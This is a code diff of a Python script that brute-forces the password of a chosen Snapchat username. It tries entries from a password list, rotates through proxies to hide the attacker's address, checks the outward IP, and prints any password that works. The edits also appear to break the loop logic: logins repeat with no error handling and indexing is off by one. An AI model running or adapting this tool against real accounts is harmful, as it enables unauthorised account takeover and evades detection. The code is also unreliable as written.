@@ -43,24 +43,21 @@ dir_path = os.path.dirname(os.path.realpath(__file__))
 #Connecting to a proxy with urllib3
 print("Connecting to Proxy")
 proxy_list = open(dir_path + "/proxies.txt", 'r+').readlines()
-
-proxies1 = ['52.194.26.48:8080',
-'87.244.176.213:53545']
-proxy_pool = cycle(proxies1)
-
+proxy_list = [item.replace("""\n""", "") for item in proxy_list]
+proxy_pool = cycle(proxy_list)
 url = "https://httpbin.org/ip"
-for i in range(len(proxies1)):
+for i in range(len(proxy_list)-1):
     #Get a proxy from the pool
     proxy = next(proxy_pool)
     try:
         response = requests.get(url,proxies={"http": proxy, "https": proxy})
-        print(response.json())
         working_proxies.append(proxy)
+        break;
     except:
         pass;
 lenght_of_proxy = len(working_proxies)
 
-number_of_proxy_rand = random.randint(0,lenght_of_proxy-1)
+number_of_proxy_rand = random.randint(0,int(lenght_of_proxy-1))
 
 number_of_proxy_rand = number_of_proxy_rand
 proxies = {
@@ -79,7 +76,7 @@ l.proxies = proxies
 
 s = Snapchat()
 
-
+print("Checking Ip")
 r = l.get("https://httpbin.org/ip")
 print("your connecting through: ", r.text)
 
@@ -96,13 +93,12 @@ def bruting(worker):
     time.sleep(0.5)
     with login_lock:
         for i in range(len(password_list)) :
-            print("\n", "Username: ", snap_name, "\n","Trying Password: ", str(password_list[i-1]), "\n", str(i-1), "passwords tried out of", len(password_list))
-            try :
+            print("\n", "Username: ", snap_name, "\n","Trying Password: ", str(password_list[i-1]), "\n", str(i), "passwords tried out of", len(password_list))
+            for x in range(5):
+                print("\n")
                 s.login(snap_name, password_list[i-1])
                 print("Password found, password for", snap_name, "is:", password_list[i-1])
                 quit()
-            except :
-                pass
 
 
 q = Queue()
